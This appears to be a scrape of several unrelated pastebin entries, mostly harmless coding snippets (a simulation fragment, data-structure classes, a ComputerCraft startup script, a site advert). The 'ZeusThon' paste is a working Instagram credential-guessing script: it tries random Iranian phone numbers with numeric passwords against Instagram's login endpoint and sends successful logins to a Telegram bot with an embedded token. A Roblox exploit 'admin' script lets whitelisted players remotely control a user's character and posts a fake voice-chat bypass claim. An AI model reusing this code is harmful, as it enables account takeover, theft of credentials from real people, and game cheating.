			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				return x, y
	return x, y

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

while True:
	pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
	draw = ImageDraw.Draw(pil_image)

	for i, (x, y, entity) in enumerate(entities):
		x0, y0 = CX, CY
		if_rev = math.pi
		x, y = movement(x, y, x0, y0)
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 0, anchor='nw', image=photo_image)
	root.update()"
iAypqucY,Untitled,smj007,Python,Thursday 7th of March 2024 06:52:17 PM CDT,"class MovingAverage:

    def __init__(self, size: int):
        self.size = size
        self.q = deque()
        self.count = 0
        self.sum = 0      

    def next(self, val: int) -> float:
        self.count += 1

        if self.count <= self.size:
            self.sum += val
            self.q.append(val)
            return self.sum/self.count
        else:
            front = self.q.popleft()
            self.sum = self.sum - front + val
            return self.sum/self.size"
Fs3HAqFL,Untitled,ZeusThon,Python,Thursday 7th of March 2024 06:51:12 PM CDT,"import requests,time,random
from user_agent import generate_user_agent
from random import choice

def i(user,passe):
 
    print(user+"":""+passe)
    oo=user+"":""+passe
    token = ""6944454543:AAFx_LVfmfqJyT8h1yLDxsYosX3BYhoAIlA""
    ID = ""5297215129""
    try:
	    url=""https://www.instagram.com/api/v1/web/accounts/login/ajax/""
	    head={

	'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
	'Viewport-Width':'636',
	'X-Asbd-Id':'129477',
	'X-Csrftoken':'KLHFvQGryMJQjfNl8OnSpBedNZw0NOwO',
	'X-Ig-App-Id':'936619743392459',
	'X-Ig-Www-Claim':'0',
	'X-Instagram-Ajax':'1011874869',
	'X-Requested-With':'XMLHttpRequest',
	}
	
	    tim33 = str(time.time()).split('.')[0]
	    data = {
	        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim33}:{passe}',
	        'optIntoOneTap': 'false',
	        'queryParams': '{}',
	        'trustedDeviceRecords': '{}',
	        'username': user,
}
	    ro1= requests.post(url,headers=head,data=data).text
	    
	    if 'userId' in ro1:
	    	print(""done"")
	    	requests.post(f'https://api.telegram.org/bot6944454543:AAFx_LVfmfqJyT8h1yLDxsYosX3BYhoAIlA/sendMessage?chat_id=5297215129&text={oo}')
	    else:
	    	    
	    	print(""erorr"")
    except:
    	i(user,passe)
def Zaid():
  
        Num = ""12345098761234567890""
        Tr = str(''.join(choice([""12"", ""13"", ""14"", ""15"", ""16"", ""17"", ""18"", ""19""])))
        pas = str(''.join(choice(Num) for i in range(7)))
        user = ""+989"" + Tr + pas
        i(user,pas)
while True:
	Zaid()"
tqVxm1HC,Turtle Startup Sequence,Jameelo,Lua,Thursday 7th of March 2024 06:38:09 PM CDT,"--[[
    Startup file, could be useful later but was made at first to resume quarry code when I log back in :3
]]

function checkQuarryInterrupted() -- See if the quarry needs resuming
    -- if the save file exists, then run the quarry program as it'll handle the rest.
    if fs.exists(""common/QPROG"") then
        -- Ideally will use arguments for this but its 1am and I'm tired
        shell.run(""quarry.lua"")
    else
        print(""Quarry program was not in progress when runtime ended."")
    end
end

-- Need to check if commonUtils is installed, if not then do a full install
if fs.exists(""commonUtils.lua"") == false then
    print(""Reinstalling common utility library..."")
    shell.run(string.format(""pastebin run qMyK5xrK"")) -- run pastebin package installer so you get all of my apps >:) mwahaha
end

--os.loadAPI(""commonUtils.lua"")
-- print(""Checking for updates..."")
--[[
    To check for updates:
    Download a temp file & compare it to the current file, similar to my package installer program
    If there is a SINGLE difference, reinstall that program.
]]

-- Can make this next bit optional by having the quarry program raise a flag when running, and lowering it when not, all inside a save file.
print("""")
print(""Resuming quarry program..."")

checkQuarryInterrupted()"
whmAx1BR,Mic Up Admin Script 3.0 / Configs,LegendzHackz,Lua,Thursday 7th of March 2024 06:29:27 PM CDT,"local TeleportService = game:GetService(""TeleportService"")
local ChatService = game:GetService(""TextChatService"")
local HttpService = game:GetService(""HttpService"")
local RunService = game:GetService(""RunService"")
local Workspace = game:GetService(""Workspace"")
local Players = game:GetService(""Players"")
local Player = Players.LocalPlayer
local PlayerGui = Player.PlayerGui
local Admin = PlayerGui.Admin
local PlaceId, JobId = game.PlaceId, game.JobId

local Stalls = Workspace.Stalls

function Shorten(Username)
    local PlayerList = {}
    for _, CPlayer in pairs(Players:GetPlayers()) do
        if CPlayer.Name:lower():sub(1, #Username) == Username:lower() or CPlayer.DisplayName:lower():sub(1, #Username) == Username:lower() then
            table.insert(PlayerList, CPlayer)
        end
    end
    return PlayerList
end

function Say(Message)
    ChatService.TextChannels.RBXGeneral:SendAsync(Message)
end

function Hop()
    pcall(function()
        local Servers = {}
        for _, v in ipairs(HttpService:JSONDecode(game:HttpGetAsync(""https://games.roblox.com/v1/games/"" .. PlaceId .. ""/servers/Public?sortOrder=Asc&limit=100"")).data) do
            if type(v) == ""table"" and v.maxPlayers > v.playing and v.Id ~= JobId then
                Servers[#Servers + 1] = v.id
            end
        end
        if #Servers > 0 then
            TeleportService:TeleportToPlaceInstance(PlaceId, Servers[math.random(1, #Servers)])
        else
            print(""Server not found."")
        end
    end)
end

function FindPlayer(Target)
    pcall(function()
        local FoundMyTargetC = false

        for _, v in ipairs(Players:GetPlayers()) do
            if v.Name == Target then
                FoundMyTargetC = true
                General:SendAsync(""Server Found!"")
                break
            end
        end
    
        if not FoundMyTargetC then
            Hop()
        end
    end)
end

function View(Target)
    getgenv().Configurations.Spectate = true
    
    while getgenv().Configurations.Spectate do task.wait()
        pcall(function()
            if getgenv().Configurations.Spectate then
                Workspace.CurrentCamera.CameraSubject = Target.Character.Humanoid
            end

            local Viewing = Players.ChildRemoved:Connect(function(Child)
                pcall(function()
                    if Child.Name == Target.Name then
                        getgenv().Configurations.Spectate = false
                        Workspace.CurrentCamera.CameraSubject = Player.Character.Humanoid
                    end

                    Viewing:Disconnect()
                end)
            end)
        end)
    end
end

function Hide()
    pcall(function()
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                Player.Character.HumanoidRootPart.Velocity = Vector3.new()
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(getgenv().Configurations.Axis.X, getgenv().Configurations.Axis.Y, getgenv().Configurations.Axis.Z)
            end
        end
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                if FoundPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Jumping then
                    getgenv().Configurations.Axix.Y = -20
                end
            end
        end
    end)
end

function LoopBring()
    pcall(function()
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                Player.Character.HumanoidRootPart.Velocity = Vector3.new()
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0)
            end
        end
    end)
end

function UnView()
    pcall(function()
        getgenv().Configurations.Spectate = false
        Workspace.CurrentCamera.CameraSubject = Player.Character.Humanoid
    end)
end

function Follow()
    pcall(function()
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                local Direction = FoundPlayer.Character.Humanoid.MoveDirection
                local Offset = Direction * getgenv().Configurations.Direction
                Player.Character:SetPrimaryPartCFrame(FoundPlayer.Character.PrimaryPart.CFrame + Offset)
            end
        end
    end)
end

ChatService.MessageReceived:Connect(function(Message)
    for _, FoundPlayer in next, Players:GetPlayers() do
        if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
            if Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""disconnect"" then
                Player:Kick(""You have been disconnected."")
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""bring"" then
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""reset"" then
                Player.Character:BreakJoints()
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""rejoin"" then
                TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Player)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""hide"" then
                getgenv().Configurations.Hide = true
                getgenv().Configurations.LoopBring = false
                getgenv().Configurations.LoopFollow = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unhide"" then
                getgenv().Configurations.Hide = false
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""loopbring"" then
                getgenv().Configurations.LoopBring = true
                getgenv().Configurations.LoopFollow = false
                getgenv().Configurations.Hide = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unloopbring"" then
                getgenv().Configurations.LoopBring = false
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""loopfollow"" then
                getgenv().Configurations.LoopFollow = true
                getgenv().Configurations.LoopBring = false
                getgenv().Configurations.Hide = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unloopfollow"" then
                getgenv().Configurations.LoopFollow = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""hop"" or Message.Text == getgenv().Configurations.Prefix .. ""serverhop"" then
                Hop()
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""findplayer"" then
                FindPlayer(""ChrisEsMiPapi"")
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""spawn"" then
                getgenv().Configurations.LoopBring = false
                getgenv().Configurations.Hide = false

                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unspawn"" then
                Player.Character.HumanoidRootPart.CFrame = CFrame.new(25, 7.5, 86)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""jump"" then
                Player.Character.Humanoid:ChangeState(""Jumping"")
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""view"" then
                View(FoundPlayer)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unview"" then
                UnView()
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""bypassvc"" or Message.Text == getgenv().Configurations.Prefix .. ""bypassvoicechat"" then
                Say(""Loading."")
                task.wait(.1)
                Say(""Loading.."")
                task.wait(.1)
                Say(""Loading..."")
                task.wait(.1)
                Say(""Wait 1 Second(s) to bypass Voice Chat."")
                task.wait(1)
                Say(""Roblox VoiceChat has been successfully bypassed."")
            end
        end
    end
end)

for _, v in next, Admin:GetChildren() do
    if v.Name ~= ""TextLabel"" then
        v.Visible = true
    end
end

while task.wait() do
    pcall(function()
        if getgenv().Configurations.Hide then
            Hide()
        elseif getgenv().Configurations.LoopBring then
            LoopBring()
        elseif getgenv().Configurations.LoopFollow then
            Follow()
        end
    end)
    pcall(function()
        for Iter = 1, 5 do
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.Enabled = true
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.HoldDuration = 0 
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.RequiresLineOfSight = false
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.MaxActivationDistance = 25
        end
    end)
end"
AbE0j3gs,Pastes.io [Pastebin Alternative],xxsa,PHP,Thursday 7th of March 2024 06:27:55 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

More features example share pages QR CODEs - Embed options .. etc
Simple Ads by Google Adsense ( Few rather than Pastebin )
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
Simple & responsive interface
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Ace Editor / Code Mirror
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Report explicit pastes
Socialite (Facebook/Twitter/Google Social login)
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Load files feature
Auto generated sitemaps
User management
Admin panel to manage pastes, syntax, users, comments, pages, languages, translations & other settings
User profile page
Trending pastes page (day, week, month, year)
QR Code for share
No Captcha for logged in users feature
.. etc"
1pHx47Ut,Untitled,smj007,Python,Thursday 7th of March 2024 06:24:18 PM CDT,"class TwoSum:

    def __init__(self):
        self.nums = defaultdict(int)

    def add(self, number: int) -> None:
        self.nums[number]+= 1

    def find(self, value: int) -> bool:
        for num in self.nums:
            if (value - num) in self.nums:
                # check for duplicates
                if value-num == num:
                    return self.nums[num] > 1
                else:
                    return True
        return False"
